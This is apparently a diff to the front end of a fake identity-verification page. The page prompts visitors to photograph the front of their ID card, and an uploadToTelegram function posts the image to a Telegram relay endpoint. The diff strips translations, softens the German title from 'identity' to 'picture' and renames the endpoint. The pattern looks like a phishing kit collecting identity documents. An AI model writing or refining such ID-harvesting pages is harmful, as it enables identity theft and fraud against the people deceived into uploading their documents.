@@ -178,76 +178,12 @@ const STORAGE_KEY_LANG = "valorax_lang";
 
 const LANGS = {
   de: {
-    title: "Bestätige deine Identität",
+    title: "Bestätige dein Bild",
     sub: "Bitte fotografiere die Vorderseite deines Bildes. Achte darauf, dass alle Daten gut lesbar sind.",
     tapToPhoto: "Tippe zum Fotografieren",
     tapToShoot: "Tippe zum Auslösen",
     camError: "Kamera konnte nicht geöffnet werden.<br>Bitte erlaube Kamera-Zugriff.",
     cont: "Weiter"
-  },
-  en: {
-    title: "Verify your identity",
-    sub: "Please take a photo of the front side of your ID. Make sure all details are clearly readable.",
-    tapToPhoto: "Tap to open camera",
-    tapToShoot: "Tap to capture",
-    camError: "Camera could not be opened.<br>Please allow camera access.",
-    cont: "Continue"
-  },
-  es: {
-    title: "Verifica tu identidad",
-    sub: "Por favor, fotografía la parte frontal de tu documento. Asegúrate de que todos los datos sean legibles.",
-    tapToPhoto: "Toca para abrir la cámara",
-    tapToShoot: "Toca para capturar",
-    camError: "No se pudo abrir la cámara.<br>Permite el acceso a la cámara.",
-    cont: "Continuar"
-  },
-  fr: {
-    title: "Vérifie ton identité",
-    sub: "Prends une photo du recto de ta pièce d’identité. Assure-toi que toutes les informations sont lisibles.",
-    tapToPhoto: "Appuie pour ouvrir l’appareil photo",
-    tapToShoot: "Appuie pour capturer",
-    camError: "Impossible d’ouvrir la caméra.<br>Autorise l’accès à la caméra.",
-    cont: "Continuer"
-  },
-  it: {
-    title: "Verifica la tua identità",
-    sub: "Scatta una foto del fronte del tuo documento. Assicurati che tutti i dati siano ben leggibili.",
-    tapToPhoto: "Tocca per aprire la fotocamera",
-    tapToShoot: "Tocca per scattare",
-    camError: "Impossibile aprire la fotocamera.<br>Consenti l’accesso alla fotocamera.",
-    cont: "Continua"
-  },
-  pt: {
-    title: "Confirma a tua identidade",
-    sub: "Tira uma foto da frente do teu documento. Certifica-te de que todos os dados estão legíveis.",
-    tapToPhoto: "Toca para abrir a câmara",
-    tapToShoot: "Toca para capturar",
-    camError: "Não foi possível abrir a câmara.<br>Permite o acesso à câmara.",
-    cont: "Continuar"
-  },
-  nl: {
-    title: "Bevestig je identiteit",
-    sub: "Maak een foto van de voorkant van je identiteitsbewijs. Zorg dat alle gegevens goed leesbaar zijn.",
-    tapToPhoto: "Tik om camera te openen",
-    tapToShoot: "Tik om vast te leggen",
-    camError: "Camera kon niet worden geopend.<br>Sta cameratoegang toe.",
-    cont: "Doorgaan"
-  },
-  ru: {
-    title: "Подтвердите личность",
-    sub: "Сфотографируйте лицевую сторону документа. Убедитесь, что все данные хорошо читаемы.",
-    tapToPhoto: "Нажмите, чтобы открыть камеру",
-    tapToShoot: "Нажмите, чтобы снять",
-    camError: "Не удалось открыть камеру.<br>Разрешите доступ к камере.",
-    cont: "Продолжить"
-  },
-  zhCN: {
-    title: "确认你的身份",
-    sub: "请拍摄证件正面。请确保所有信息清晰可读。",
-    tapToPhoto: "点击打开相机",
-    tapToShoot: "点击拍摄",
-    camError: "无法打开相机。<br>请允许相机权限。",
-    cont: "继续"
   }
 };
 
@@ -388,7 +324,7 @@ async function uploadToTelegram(){
   form.append("name", "Web"); // optional
   form.append("message", "Foto von der Webseite"); // optional
 
-  const res = await fetch("/api/telegram-photo", {
+  const res = await fetch("/api/telegramfoto", {
     method: "POST",
     body: form
   });
